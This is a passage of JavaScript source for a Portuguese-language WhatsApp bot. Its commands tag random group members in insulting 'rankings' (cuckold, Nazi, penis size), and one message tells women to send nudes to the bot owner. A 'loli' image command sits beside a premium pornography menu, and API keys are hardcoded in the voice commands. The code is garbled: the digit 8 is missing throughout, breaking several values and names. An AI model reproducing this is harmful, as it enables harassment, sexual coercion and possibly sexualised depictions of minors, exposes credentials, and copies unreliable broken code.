const cornos2 = corno2[Math.floor(Math.random() * corno2.length)]
const cornos3 = corno3[Math.floor(Math.random() * corno3.length)]
const cornos4 = corno4[Math.floor(Math.random() * corno4.length)]
const cornos5 = corno5[Math.floor(Math.random() * corno5.length)]
var porcentagemcorno = ["1%", `2%`, `3%`, `4%`, `5%`, `6%`, `7`, `%`, `9%`, `10`, `11%`, `12%`,`13%`, `14%`, `15%`, `16%`, `17%`, `1%`, `19%`, `20%`, `21%`, `22`, `23%`, `24%`, `25%`, `26%`, `27%`, `2%`, `27%`, `2%`, `29%`, `30%`, `31%`, `32%`, `33%`, `34%`, `35%`, `36%`, `37%`, `3%`, `39%`, `40%`, `41%`, `42%`, `43%`, `44%`, `45%`, `46%`, `47%`, `4%`, `49%`, `50%`, `51%`, `52%`, `53%`, `54%`, `55%`, `56%`, `57%`, `5%`, `59%`, `60%`, `61%`, `62%`, `63%`, `64%`, `65%`, `66%`, `67%`, `6%`, `69%`, `70%`, `71%`, `72%`, `73%`, `74%`, `75%`, `76%`, `77%`, `7%`, `79%`, `0%`, `1%`, `2%`, `5%`, `4%`, `5%`, `6%`, `7%`, `%`, `9%`, `90%`, `91%`, `92%`, `93%`, `94%`, `95%`, `96%`, `97%`, `9%`, `99%`, `O chifre desse ai bate na lua ksksksk`]
const porcentagemc = porcentagemcorno[Math.floor(Math.random() * porcentagemcorno.length)]
const porcentag = porcentagemcorno[Math.floor(Math.random() * porcentagemcorno.length)]
const porcent = porcentagemcorno[Math.floor(Math.random() * porcentagemcorno.length)]
const porcl = porcentagemcorno[Math.floor(Math.random() * porcentagemcorno.length)]
const porg = porcentagemcorno[Math.floor(Math.random() * porcentagemcorno.length)]
const prg = porcentagemcorno[Math.floor(Math.random() * porcentagemcorno.length)]
ytb = `
Esses s√£o os cornos do grupo ${groupName}\n@${cornos1.id.split('@')[0]}\nCom uma porcentagem de ${porcent}\n@${cornos2.id.split('@')[0]}\nCom uma porcentagem de ${porcentag}\n@${cornos3.id.split('@')[0]}\nCom uma porcentagem de ${porcl}\n@${cornos4.id.split('@')[0]}\nCom uma porcentagem de ${porg}\n@${cornos5.id.split('@')[0]}\nCom uma porcentagem de ${prg}\n\n‚ö°${NomeDoBot} ‚ö°`
membr.push(cornos1.id)
membr.push(cornos2.id)
membr.push(cornos3.id)
membr.push(cornos4.id)
membr.push(cornos5.id)
mentions(ytb, membr, true)
break

case 'rankgostosos':
case 'rankgostoso':
if(!isGroup) return reply('S√≥ pode ser utilizado este comando, em grupo.')

member = []
const p01 = groupMembers
const p02 = groupMembers
const p03 = groupMembers
const p04 = groupMembers
const p05 = groupMembers
const o01 = p01[Math.floor(Math.random() * p01.length)]
const o02 = p02[Math.floor(Math.random() * p02.length)]
const o03 = p03[Math.floor(Math.random() * p03.length)]
const o04 = p04[Math.floor(Math.random() * p04.length)]
const o05 = p05[Math.floor(Math.random() * p05.length)]
luy = `
Parados!ü§öü§ö\n\n1=ü§öü§≠@${o01.id.split('@')[0]}ü§öü§≠\n\n\n2=ü§öü§≠@${o02.id.split('@')[0]}ü§öü§≠\n\n\n3=ü§öü§≠@${o03.id.split('@')[0]}ü§öü§≠\n\n\n4=ü§öü§≠@${o04.id.split('@')[0]}ü§öü§≠\n\n\n5=ü§öü§≠@${o05.id.split('@')[0]}ü§öü§≠\n\n\nMulta por serem gostosos dmsüò≥ pague pena trabalhando em nossa ag√™ncia de modelos üòä by: ${NomeDoBot}`
member.push(o01.id)
member.push(o02.id)
member.push(o03.id)
member.push(o04.id)
member.push(o05.id)
mentions(luy, member, true)
break

case 'rankgostosas':
case 'rankgostosa':
if(!isGroup) return reply('S√≥ pode ser utilizado este comando, em grupo.')

member = []
const p1 = groupMembers
const p2 = groupMembers
const p3 = groupMembers
const p4 = groupMembers
const p5 = groupMembers
const o1 = p1[Math.floor(Math.random() * p1.length)]
const o2 = p2[Math.floor(Math.random() * p2.length)]
const o3 = p3[Math.floor(Math.random() * p3.length)]
const o4 = p4[Math.floor(Math.random() * p4.length)]
const o5 = p5[Math.floor(Math.random() * p5.length)]
luy = `
Paradas!ü§öü§ö\n\n1=ü§öü§≠@${o1.id.split('@')[0]}ü§öü§≠\n\n\n2=ü§öü§≠@${o2.id.split('@')[0]}ü§öü§≠\n\n\n3=ü§öü§≠@${o3.id.split('@')[0]}ü§öü§≠\n\n\n4=ü§öü§≠@${o4.id.split('@')[0]}ü§öü§≠\n\n\n5=ü§öü§≠@${o5.id.split('@')[0]}ü§öü§≠\n\n\nMultas por serem gostosas dmsüò≥ pague pena enviando nud no PV do donoüòä by Bot`
member.push(o1.id)
member.push(o2.id)
member.push(o3.id)
member.push(o4.id)
member.push(o5.id)
mentions(luy, member, true)
break

case 'ranknazista':
if(!isGroup) return reply('S√≥ pode ser utilizado este comando, em grupo.')

try{
if(!isGroup) return reply(enviar.msg.grupo)
d = []
teks = 'üíÇ‚Äç‚ôÇÔ∏èRank dos mais nazistas do gp\n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `üíÇ‚Äç‚ôÇÔ∏è‚ùß @${groupMembers[r].id.split('@')[0]}\n`
d.push(groupMembers[r].id)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
reply('Deu erro, tente novamente :/')
}
break

case 'rankotakus':
if(!isGroup) return reply('S√≥ pode ser utilizado este comando, em grupo.')

membr = []
const otaku1 = groupMembers
const otaku2 = groupMembers
const otaku3 = groupMembers
const otaku4 = groupMembers
const otaku5 = groupMembers
const otaku6 = groupMembers
const otaku7 = groupMembers
const otaku = groupMembers
const otaku9 = groupMembers
const otaku10 = groupMembers
const otakus1 = otaku1[Math.floor(Math.random() * otaku1.length)]
const otakus2 = otaku2[Math.floor(Math.random() * otaku2.length)]
const otakus3 = otaku3[Math.floor(Math.random() * otaku3.length)]
const otakus4 = otaku4[Math.floor(Math.random() * otaku4.length)]
const otakus5 = otaku5[Math.floor(Math.random() * otaku5.length)]
const otakus6 = otaku6[Math.floor(Math.random() * otaku6.length)]
const otakus7 = otaku7[Math.floor(Math.random() * otaku7.length)]
const otakus = otaku[Math.floor(Math.random() * otaku.length)]
const otakus9 = otaku9[Math.floor(Math.random() * otaku9.length)]
const otakus10 = otaku10[Math.floor(Math.random() * otaku10.length)]
ytb = `esses s√£o os otakus fedidos do grupo\n@${otakus1.id.split('@')[0]}\n@${otakus2.id.split('@')[0]}\n@${otakus3.id.split('@')[0]}\n@${otakus4.id.split('@')[0]}\n@${otakus5.id.split('@')[0]}\n@${otakus6.id.split('@')[0]}\n@${otakus7.id.split('@')[0]}\n@${otakus.id.split('@')[0]}\n@${otakus9.id.split('@')[0]}\n@${otakus10.id.split('@')[0]}\n\n‚ö°${NomeDoBot} ‚ö°`
membr.push(otakus1.id)
membr.push(otakus2.id)
membr.push(otakus3.id)
membr.push(otakus4.id)
membr.push(otakus5.id)
membr.push(otakus6.id)
membr.push(otakus7.id)
membr.push(otakus.id)
membr.push(otakus9.id)
membr.push(otakus10.id)
mentions(ytb, membr, true)
break

case 'rankpau':
if(!isGroup) return reply('S√≥ pode ser utilizado este comando, em grupo.')

membr = []
const pauz1 = groupMembers
const pauz2 = groupMembers
const pauz3 = groupMembers
const pauz4 = groupMembers
const pauz5 = groupMembers
const paus1 = pauz1[Math.floor(Math.random() * pauz1.length)]
const paus2 = pauz2[Math.floor(Math.random() * pauz2.length)]
const paus3 = pauz3[Math.floor(Math.random() * pauz3.length)]
const paus4 = pauz4[Math.floor(Math.random() * pauz4.length)]
const paus5 = pauz5[Math.floor(Math.random() * pauz5.length)]
var pcpau1 = ["Minusc√∫lo", `Pequenino`, `Pequeno`, `M√©dio`, `Grandinho`, `Grande`, `Grand√£o`, `Gigante`, `Gigantesco`, `Enorme`, `BATENDO NA LUA`, `QUEIMADO, T√ÉO GRANDE QUE BATEU NO SOL E QUEIMOU ksksksk`]
var pcpau2 = ["Minusc√∫lo", `Pequenino`, `Pequeno`, `M√©dio`, `Grandinho`, `Grande`, `Grand√£o`, `Gigante`, `Gigantesco`, `Enorme`, `BATENDO NA LUA`, `QUEIMADO, T√ÉO GRANDE QUE BATEU NO SOL E QUEIMOU ksksksk`]
var pcpau3 = ["Minusc√∫lo", `Pequenino`, `Pequeno`, `M√©dio`, `Grandinho`, `Grande`, `Grand√£o`, `Gigante`, `Gigantesco`, `Enorme`, `BATENDO NA LUA`, `QUEIMADO, T√ÉO GRANDE QUE BATEU NO SOL E QUEIMOU ksksksk`]
var pcpau4 = ["Minusc√∫lo", `Pequenino`, `Pequeno`, `M√©dio`, `Grandinho`, `Grande`, `Grand√£o`, `Gigante`, `Gigantesco`, `Enorme`, `BATENDO NA LUA`, `QUEIMADO, T√ÉO GRANDE QUE BATEU NO SOL E QUEIMOU ksksksk`]
var pcpau5 = ["Minusc√∫lo", `Pequenino`, `Pequeno`, `M√©dio`, `Grandinho`, `Grande`, `Grand√£o`, `Gigante`, `Gigantesco`, `Enorme`, `BATENDO NA LUA`, `QUEIMADO, T√ÉO GRANDE QUE BATEU NO SOL E QUEIMOU ksksksk`]
const pc1 = pcpau1[Math.floor(Math.random() * pcpau1.length)]
const pc2 = pcpau2[Math.floor(Math.random() * pcpau2.length)]
const pc3 = pcpau3[Math.floor(Math.random() * pcpau3.length)]
const pc4 = pcpau4[Math.floor(Math.random() * pcpau4.length)]
const pc5 = pcpau5[Math.floor(Math.random() * pcpau5.length)]
pdr = `Esses s√£o os caras com o menor e maior pau do Grupo\n${groupName}\n\n@${paus1.id.split('@')[0]}\n${pc1}\n@${paus2.id.split('@')[0]}\n${pc2}\n@${paus3.id.split('@')[0]}\n${pc3}\n@${paus4.id.split('@')[0]}\n${pc4}\n@${paus5.id.split('@')[0]}\n${pc5}\n\n${NomeDoBot}`
membr.push(paus1.id)
membr.push(paus2.id)
membr.push(paus3.id)
membr.push(paus4.id)
membr.push(paus5.id)
mentions(pdr, membr, true)
break 

//========FINAL DOS JOGOS=============

//========VOZES=============

case 'lyrics':
try {
reply(mess.wait)
teks = body.slice(8)
anu = await fetchJson(`https://api.brizaloka-api.tk/ia/lyricsfinder?apikey=17desetembro&query=${teks}`, {method: 'get'})
reply(`*Nome da m√∫sica: ${teks}*\n*Letras: ${anu.lyrics}*`)
} catch (e) {
    console.log(e)
    reply(`erro!!`)
}
break

case 'ptlyrics':
try {
reply(mess.wait)
teks = body.slice(10)
anu = await fetchJson(`https://api.brizaloka-api.tk/ia/lyricsfinder?apikey=17desetembro&query=${teks}`, {method: 'get'})
dated = `*Nome da m√∫sica: ${teks}*\n*Letras:*\n*${anu.lyrics}*`
} catch (e) {
    console.log(e)
    reply(`erro!!`)
}
break

       case 'ibere':
if(args.length < 1) return reply('Escreva o texto de deseje que fale')
teks = body.slice(7)
uber.getAudioUrl('pub_mgqgxwvhxsukcqqawy', 'pk_d4cdd6d0-5ab7-4067-b9e2-8cdfdae6ec9f', 'ibere', teks).then(async res => {
    buff = await getBuffer(res)
    pl.sendMessage(from, {audio: buff, mimetype: 'audio/mpeg'}, { quoted: m })
})
break

            case 'eminem':
if(args.length < 1) return reply('Escreva o texto de deseje que fale')
teks = body.slice(7)
uber.getAudioUrl('pub_mgqgxwvhxsukcqqawy', 'pk_d4cdd6d0-5ab7-4067-b9e2-8cdfdae6ec9f', 'eminem', teks).then(async res => {
    buff = await getBuffer(res)
    pl.sendMessage(from, {audio: buff, mimetype: 'audio/mpeg'}, { quoted: m })
})
break

            case 'chapolin':
if(args.length < 1) return reply('Escreva o texto de deseje que fale')
teks = body.slice(7)
uber.getAudioUrl('pub_mgqgxwvhxsukcqqawy', 'pk_d4cdd6d0-5ab7-4067-b9e2-8cdfdae6ec9f', 'chapolin-br', teks).then(async res => {
    buff = await getBuffer(res)
    pl.sendMessage(from, {audio: buff, mimetype: 'audio/mpeg'}, { quoted: m })
})
break

            case 'patolino':
if(args.length < 1) return reply('Escreva o texto de deseje que fale')
teks = body.slice(7)
uber.getAudioUrl('pub_mgqgxwvhxsukcqqawy', 'pk_d4cdd6d0-5ab7-4067-b9e2-8cdfdae6ec9f', 'patolino', teks).then(async res => {
    buff = await getBuffer(res)
    pl.sendMessage(from, {audio: buff, mimetype: 'audio/mpeg'}, { quoted: m })
})
break

            case 'faustao':
if(args.length < 1) return reply('Escreva o texto de deseje que fale')
teks = body.slice(7)
uber.getAudioUrl('pub_mgqgxwvhxsukcqqawy', 'pk_d4cdd6d0-5ab7-4067-b9e2-8cdfdae6ec9f', 'faustao', teks).then(async res => {
    buff = await getBuffer(res)
    pl.sendMessage(from, {audio: buff, mimetype: 'audio/mpeg'}, { quoted: m })
})
break

//========FINAL VOZES=============



//========LOGOS/+18=============

			case 'mulheres': case 'pesquisar-mulheres':
reply(mess.wait)
var query = ["cecan hd","cecan indo","cewe cantik", "cewe aesthetic", "cecan aesthetic"]
var data = await pinterest(pickRandom(query))
var but = [{buttonId: `${prefix}${command}`, buttonText: { displayText: "[ü©∏] ùêèùêëùêéÃÅùêóùêàùêåùêé [ü©∏] " }, type: 1 }]
pl.sendMessage(from, { caption: "AQUI EST√Å!!!", image: { url: pickRandom(data.result) }, buttons: but, footer: 'PRESSIONE O BOT√ÉO ABAIXO PARA A PR√ìXIMA FOTO' }, { quoted: m})
 break
			case 'foto-cria': case 'foto-de-cria':
		reply(mess.wait)
var query = ["foto de cria","cria rj","foto de cria perfil","cria do rj","'foto-cria","'foto cria","'foto-de-cria","foto de cria"]
var data = await pinterest(pickRandom(query))
var but = [{buttonId: `${prefix}${command}`, buttonText: { displayText: "[ü©∏] ùêèùêëùêéÃÅùêóùêàùêåùêé [ü©∏] " }, type: 1 }]
pl.sendMessage(from, { caption: "AQUI EST√Å!!", image: { url: pickRandom(data.result) }, buttons: but, footer: 'PRESSIONE O BOT√ÉO ABAIXO PARA A PR√ìXIMA FOTO' }, { quoted: m })
break

case 'yaoi':
reply(mess.wait)
var query = ["yaoi","yaoi aesthetic","yaoi hd","yaoi ganteng"]
var data = await pinterest(pickRandom(query))
var but = [{buttonId: `${prefix}${command}`, buttonText: { displayText: "[ü©∏] ùêèùêëùêéÃÅùêóùêàùêåùêé [ü©∏] " }, type: 1 }]
pl.sendMessage(from, { caption: "AQUI EST√Å!!! ", image: { url: pickRandom(data.result) }, buttons: but, footer: 'PRESSIONE O BOT√ÉO ABAIXO PARA A PR√ìXIMA FOTO' }, { quoted: m })
 break

case 'waifu':
 reply(mess.wait)
var query = ["waifu","waifu aesthetic","waifu hd"]
var data = await pinterest(pickRandom(query))
var but = [{buttonId: `${prefix}waifu`, buttonText: { displayText: "[ü©∏] ùêèùêëùêéÃÅùêóùêàùêåùêé [ü©∏] " }, type: 1 }]
pl.sendMessage(from, { caption: "AQUI EST√Å!!!", image: { url: pickRandom(data.result) }, buttons: but, footer: 'PRESSIONE O BOT√ÉO ABAIXO PARA A PR√ìXIMA FOTO' }, { quoted: m })
 break

case 'husbu':
reply(mess.wait)
var query = ["husbu anime","husbu hd","husbu aesthetic"]
var data = await pinterest(pickRandom(query))
var but = [{buttonId: `${prefix}husbu`, buttonText: { displayText: "[ü©∏] ùêèùêëùêéÃÅùêóùêàùêåùêé [ü©∏] " }, type: 1 }]
pl.sendMessage(from, { caption: "AQUI EST√Å!!!", image: { url: pickRandom(data.result) }, buttons: but, footer: 'PRESSIONE O BOT√ÉO ABAIXO PARA A PR√ìXIMA FOTO' }, { quoted: m })
 break


case 'loli':
reply(enviar.espere)
{
buffer = `https://api-manuella2-pl.herokuapp.com/loli`
const buttons01 = [{buttonId: `${prefix + command}`, buttonText: {displayText: '[ü©∏] ùêèùêëùêéÃÅùêóùêàùêåùêé [ü©∏]'}, type: 1}]
const buttonMessage01 = {image:{url:buffer},caption: "AQUI EST√Å!",footer: 'üëÅÔ∏è',buttons: buttons01,headerType: 4}
pl.sendMessage(from, buttonMessage01, {quoted:m})}
break

case 'cosplay':
reply(enviar.espere)
{
buffer = `https://api.zacros.my.id/randomimg/cosplay`
const buttons01 = [{buttonId: `${prefix + command}`, buttonText: {displayText: '[ü©∏] ùêèùêëùêéÃÅùêóùêàùêåùêé [ü©∏]'}, type: 1}]
const buttonMessage01 = {image:{url:buffer},caption: "AQUI EST√Å!",footer: 'PRESSIONE O BOT√ÉO ABAIXO PARA A PR√ìXIMA FOTOÔ∏è',buttons: buttons01,headerType: 4}
pl.sendMessage(from, buttonMessage01, {quoted:m})}
break

case 'juice':{
let link = `https://textpro.me/fruit-juice-text-effect-861.html`
 anui = await textpro(link, q)
     fakey(`Espere um minuto est√° fazendo o criador cerca de 1 minuto a menos`) 
     console.log(anui)
    pl.sendMessage(from, {image:{url:anui}, caption:"PRONTO!"}, {quoted:m})
}
   break

case 'metadinha': {
pl.sendMessage(from, { react: { text: `ü©∏`, key: m.key }})    
let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
let random = anu[Math.floor(Math.random() * anu.length)]
pl.sendMessage(from, { image: { url: random.male }, caption: `MASCULINO` }, { quoted: selo })
pl.sendMessage(from, { image: { url: random.female }, caption: `FEMININO` }, { quoted: selo })
}
break

case 'metadinha2': {
                metadinha_guxta = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
                random = metadinha_guxta[Math.floor(Math.random() * metadinha_guxta.length)]
        var wbutsssss = [
{buttonId: `affscringe`, buttonText: {displayText: `[ü©∏]`}, type: 1},
]
      let buttonssMessssage = {
       image: {url:random.male},
       caption:  `‡πñ€£€£€úùêåùêÄùêíùêÇùêîùêãùêàùêçùêé`,
      footer: `${NomeDoBot}`,
      buttons: wbutsssss,
      headerType: 4
      }
await pl.sendMessage(from,buttonssMessssage, { quoted: selo }).catch(err => {
    return('Error!')
}) 
                 
                           var wbutssss = [
{buttonId: `affscringe`, buttonText: {displayText: `[ü©∏]`}, type: 1},
]
      let buttonssMesssage = {
       image: {url:random.female},
       caption:  `‡πñ€£€£€úùêÖùêÑùêåùêàùêçùêàùêçùêé`,
      footer: `${NomeDoBot}`,
      buttons: wbutssss,
      headerType: 4
      }
await pl.sendMessage(from,buttonssMesssage, { quoted:m }).catch(err => {
    return('Error!')
}) 
}
	    break
	    
case 'neko2':
reply(enviar.espere)			
   waifud = await axios.get('https://waifu.pics/api/sfw/neko')
var wbutsss = [
{buttonId: `${prefix}neko2`, buttonText: {displayText: `[ü©∏] ùêèùêëùêéÃÅùêóùêàùêåùêé [ü©∏]`}, type: 1},
]
      let buttonssMessage = {
       image: {url:waifud.data.url},
       caption:  `Aqui est√°...`,
      footer: `${NomeDoBot}`,
      buttons: wbutsss,
      headerType: 4
      }
await pl.sendMessage(from,buttonssMessage, { quoted:m }).catch(err => {
    return('Error!')
}) 
break


case 'zoro': case 'luffy': case 'sanji': case 'ussop': case 'nami': case 'copper': case 'naruto': 
case 'minato': case 'sasuke': case 'sakura': case 'boruto': case 'sarada': case 'mitsuki':
case 'orochimaru': case 'tsunade': case 'kakashi': case 'killua': case 'gon': case 'rimuru': 
case 'sagiri': case 'natsu': case 'tanjirou': case 'nezuko': case 'senku': 
pl.sendMessage(from, { react: { text: `ü©∏`, key: m.key }})  
const judul = command
hx.pinterest(judul)
.then(result => {
angka = ['1','2','3','4','5','6','7','8','9']
const randomnay1 = angka[Math.floor(Math.random() * (angka.length))]	
const buttons = [{buttonId: `${prefix + command}`, buttonText: {displayText: '[ü©∏] ùêèùêëùêéÃÅùêóùêàùêåùêé [ü©∏]'}, type: 1}]
const buttonMessage = {image: {url: result[randomnay1]},caption: `Pronto, Seu Humano \nAqui Esta Sua ${command}, Caso Queira Mais, Clique no Bot√£o Abaixo`,buttons: buttons,headerType: 4}
pl.sendMessage(from, buttonMessage, {quoted:selo})})
break

//=========== Menu +18 =============\\

case 'pornovid':{
if(!isPremium) return reply(enviar.msg.premium)
reply(`J√° estou enviando no pv ${pushname}`)
await pl.sendMessage(from, {react: { text: "üòà", key: info.key }})
  bla = JSON.parse(fs.readFileSync("./lib/sexv.json")) 
button = [
  {buttonId: `${prefix}pornovid`, buttonText: {displayText: 'üòà[suivant]üòà'}, type: 1}
]
buttonMessage = {
 video: {url: bla[Math.floor(Math.random() * bla.length)],
 quoted: selo},
 caption: '(‚Å†¬†‚Å†Àò‚Å†¬†‚Å†¬≥‚Å†Àò‚Å†)‚Å†‚ô•',
 footer: `@${pushname}`,
 button: button,
 headerType: 1
}
pl.sendMessage(sender, buttonMessage)
}
break


//=================================\\


//========(FUN√á√ïES-PORNO-AQUI)=======\\

case 'hentailist':
case 'listhentai':
if(!isRegistro) return reply(`Fa√ßa Seu Login Primeiro ${prefix}Registro, E Clique no Bot√£o De Login`)
pl.sendMessage(from, { react: { text: `${emoji1}`, key: m.key }})
 {
timestampe = speed();
latensie = speed() - timestampe
uptime = process.uptime()
adivinhaa = info.key.id.length > 21 ? 'Android ü•¥' : info.key.id.substring(0, 2) == '3A' ? 'IPHONE üîãüîå' : 'ZAP DA WEB üíª';
sections = [
{
title:`[${emoji1}] AQUA BOT SUPREMACY [${emoji2}]`,
rows: [
{title: `[${emoji1}] AHEGAO [${emoji2}]`, rowId: `${prefix}ahegao`},
{title: `[${emoji1}] ASS [${emoji2}]`, rowId: `${prefix}ass`},
{title: `[${emoji1}] DBSM [${emoji2}]`, rowId: `${prefix}bdsm`},
{title: `[${emoji1}] BLOWJOB [${emoji2}]`, rowId: `${prefix}blowjob`},
{title: `[${emoji1}] CUCKOLD [${emoji2}]`, rowId: `${prefix}cuckold`},
{title: `[${emoji1}] CUM [${emoji2}]`, rowId: `${prefix}cum`},
{title: `[${emoji1}] ERO [${emoji2}]`, rowId: `${prefix}ero`},
{title: `[${emoji1}] FOOT [${emoji2}]`, rowId: `${prefix}foot`},
{title: `[${emoji1}] FEMDOM [${emoji2}]`, rowId: `${prefix}femdom`},
{title: `[${emoji1}] GLASSES [${emoji2}]`, rowId: `${prefix}glasses`},
{title: `[${emoji1}] HENTAIVIDEO [${emoji2}]`, rowId: `${prefix}hentai3`},
{title: `[${emoji1}] HENTAIGIF [${emoji2}]`, rowId: `${prefix}hentai2`},
{title: `[${emoji1}] HENTAI [${emoji2}]`, rowId: `${prefix}hentai`},
{title: `[${emoji1}] ORGY [${emoji2}]`, rowId: `${prefix}orgy`},
{title: `[${emoji1}] JAHY [${emoji2}]`, rowId: `${prefix}jahy`},
{title: `[${emoji1}] NEKO [${emoji2}]`, rowId: `${prefix}neko`},
{title: `[${emoji1}] THIGHS [${emoji2}]`, rowId: `${prefix}thighs`},
{title: `[${emoji1}] YURI [${emoji2}]`, rowId: `${prefix}yuri`},
{title: `[${emoji1}] TENTACLES [${emoji2}]`, rowId: `${prefix}tentacles`}
]
},
]
 

const listMessage2 = {
text: `
‚ï≠‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚óâ                                       ‚óâ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïÆ
       ‚ïî‚îâ${emoji1}‚îâ‚ïê‚ïê‚ïê„Äéüíß„Äè‚ïê‚ïê‚ïê‚îâ${emoji1}‚îâ‚ïó    
       ‚ïë    „Ö§   „Ö§üá≤¬†üá™¬†üá≥¬†üá∫¬†¬†             ‚ïë
       ‚ïö‚îâ${emoji1}‚îâ‚ïê‚ïê‚ïê„Äéüíß„Äè‚ïê‚ïê‚ïê‚îâ${emoji1}‚îâ‚ïù    
‚ï∞‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚óâ                                       ‚óâ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïØ
„Ö§„Ö§‡Ω≤‚ãÆ ‡æÄüíß‚èù ‡Ω≤‚ãÆ ‡æÄ  ${emoji1} ‡Ω≤‚ãÆ ‡æÄ‚èùüíß‡Ω≤‚ãÆ ‡æÄ
„Ö§„Ö§  „Ö§ 
‚î†‚û• *[üë§] Ol√°* ${pushname}
‚î†‚û• *[üó£Ô∏è] Aqui Tenho as Melhores Api de Hentai*
‚î†‚û• *[üë•] Escolha um Da Lista e Seja Feliz*
‚ï∞‚îÄ‚ïº‚îÅ‚îÅ‚îÅ‚ïê‚ïê‚îÅ‚îÅ‚îÅ‚â∫üíß‚âª‚îÅ‚îÅ‚îÅ‚ïê‚ïê‚îÅ‚îÅ‚îÅ‚ïæ‚îÄ‚ïØ`,
  footer: `‚û•@Licht.Offc\n‚û•@AquaBot.Wpp`,
  title: ``,
  buttonText:`[${emoji1}] HENTAI LIST[${emoji1}]`,
  sections
}
sendMsg = await pl.sendMessage(from, listMessage2, {quoted: selo})
}
break

case 'ahegao':
case 'ass':
case 'bdsm':
case 'blowjob':
case 'cuckold':
case 'cum':
case 'ero':
case 'kasedaiki':
case 'femdom':
case 'foot':
case 'gangbang':
case 'glasses':
case 'hentai2':
case 'jahy':
case 'manga':
case 'masturbation':
case 'neko':
case 'orgy':
case 'panties':
case 'pussy':
case 'neko2':
case 'tentacles':
case 'thighs':
case 'yuri':
case 'zettai':
if (!isPremium) return reply(enviar.msg.premium)
buttonss = [

{buttonId: `${prefix}${command}`, buttonText: {displayText: `[ü©∏] ùêèùêëùêéÃÅùêóùêàùêåùêé [ü©∏]`}, type: 1}]

buttonsMessagse = {

image: {url: `https://tohka.tech/api/hentai/${command}?apikey=${tohkapi}`},

caption: `Pronto, Seu Humano \nAqui Esta Sua ${command}, Caso Queira Mais, Clique no Bot√£o Abaixo`,

footer: ` ${NomeDoBot} `,

buttons: buttonss,

headerType: 4

}

sendMsg = pl.sendMessage(sender, buttonsMessagse, {quoted: selo})

break

case 'hentai-neko' :
case 'hneko' :
if (!isPremium) return reply(enviar.msg.premium)
reply(enviar.espere)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
 let hnekobot = [
    {buttonId: `${prefix}${command}`, buttonText: {displayText: `[ü©∏] ùêèùêëùêéÃÅùêóùêàùêåùêé [ü©∏]`}, type: 1},
    ]
  let button3Messages = {
   image: {url:waifudd.data.url},
   caption:  `AKI EST√Å PUNHETEIRO...`,
  buttons: hnekobot,
  headerType: 1
  }      
await pl.sendMessage(from, button3Messages, { quoted:m }).catch(err => {
    return('Error!')
})
break

 case 'mia': {
 
 pl.sendMessage(from, { react: { text: `üëã`, key: m.key }})      
		let { pinterest } = require('./fun√ß√µes de cmd/fun√ß√µes/scraper')
const pesquisass = ["mia khalifa","mia khalifa hd","khalifa", "mia khalifa 2022", "porno xvideo"]
let searchqs = pesquisass[Math.floor(Math.random() * pesquisass.length)]


 let getpin2 = await pinterest("mia khalifa")
 let resultpin2 = getpin2[Math.floor(Math.random() * getpin2.length)]
const figg = await getBuffer(resultpin2)
buffer = await imageToWebp(figg)
let encmedia8 = await pl.sendVideoAsSticker(from, resultpin2, m, { packname: `ùêÄùêäùêÄùêåùêÑ - ùêÅùêéùêì`, author: `MIA KHALIFA` })
await fs.unlinkSync(encmedia8)
}

break


 case 'hentai': {
if (!isPremium) return reply(enviar.msg.premium)
reply(enviar.espere)
anu = await hentai()
result = anu[Math.floor(Math.random() * anu.length)]
     pl.sendMessage(from, { video: { url: result.video_1 }, caption: `‚û§ T√≠tulo : ${result.title}\n‚û§ Views : ${result.views_count}\n‚û§ compartilhamentos : ${result.share_count}` }, { quoted: m })
}
break

case 'porno': {
if (q) return reply(`Exemplo :\n${prefix + command} mirian`)
if (!isPremium) return reply(enviar.msg.premium)
reply(enviar.espere)
anu = await pornok()
      pl.sendMessage(from, { video: { url: 'https://tikporntok.com/'+anu.video }, caption: `‚û§ T√≠tulo : ${anu.title}\n‚û§ Espectadores : ${anu.views}\n‚û§ Tags : ${anu.tags}\n‚û§ Likes : ${anu.like}\n‚û§ Dislikes : ${anu.dislike} ` }, { quoted: m })
}
break 


//========(FINAL DE FUN√á√ïES-PORNO-AQUI)=======\\


//=============ALTERADORES=============\\

case 'tupai':
if (!isQuotedAudio) return reply('Marque um √°udio')
reply(enviar.espere)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a "atempo=0.5,asetrate=65100"' ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
pl.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: selo})
fs.unlinkSync(ran)
})
break

case 'reverse':
if (!isQuotedAudio) return reply('Marque um √°udio')
reply(enviar.espere)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter_complex "areverse" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
pl.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: selo})
fs.unlinkSync(ran)
})
break

case 'fat':
if (!isQuotedAudio) return reply('Marque um √°udio')
reply(enviar.espere)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
